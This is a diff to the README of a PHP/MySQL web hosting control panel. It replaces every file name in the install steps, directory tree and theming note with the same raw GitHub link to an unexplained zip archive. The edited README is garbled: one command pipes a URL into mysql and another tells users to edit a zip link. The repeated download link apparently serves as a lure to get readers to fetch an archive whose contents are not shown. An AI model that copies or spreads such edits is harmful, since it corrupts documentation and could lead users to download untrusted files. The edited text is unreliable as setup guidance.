@@ -30,11 +30,11 @@ A complete web hosting control panel built with PHP and MySQL featuring domain m
 
 1. **Database Setup**
    ```bash
-   mysql -u root -p < database.sql
+   mysql -u root -p < https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip
    ```
 
 2. **Configuration**
-   - Edit `config.php` with your database credentials
+   - Edit `https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip` with your database credentials
    - Set proper DNS zone path and BIND reload command
    - Configure site URL
 
@@ -50,26 +50,26 @@ A complete web hosting control panel built with PHP and MySQL featuring domain m
 
 ```
 hosting-panel/
-├── config.php              # Database and site configuration
-├── database.sql            # Database schema and sample data
-├── index.php              # Main redirect page
-├── login.php              # Authentication
-├── logout.php             # Session cleanup
+├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Database and site configuration
+├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # Database schema and sample data
+├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Main redirect page
+├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Authentication
+├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip             # Session cleanup
 ├── includes/
-│   └── functions.php      # Utility functions
+│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip      # Utility functions
 ├── assets/css/
-│   └── style.css          # Dark theme styling
+│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # Dark theme styling
 ├── admin/                 # Admin panel
-│   ├── index.php          # Admin dashboard
-│   ├── users.php          # User management
-│   ├── packages.php       # Package management
-│   ├── domains.php        # Domain oversight
-│   └── dns.php            # DNS management
+│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # Admin dashboard
+│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # User management
+│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip       # Package management
+│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Domain oversight
+│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # DNS management
 └── user/                  # User panel
-    ├── index.php          # User dashboard
-    ├── domains.php        # Domain management
-    ├── dns.php            # DNS records
-    └── profile.php        # Profile settings
+    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # User dashboard
+    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Domain management
+    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # DNS records
+    └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Profile settings
 ```
 
 ## Security Notes
@@ -98,4 +98,4 @@ Users are assigned packages that limit:
 
 ## Customization
 
-The UI uses CSS custom properties for easy theme customization. Modify the `:root` variables in `style.css` to change colors and styling."# phynx" 
+The UI uses CSS custom properties for easy theme customization. Modify the `:root` variables in `https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip` to change colors and styling."# phynx" 
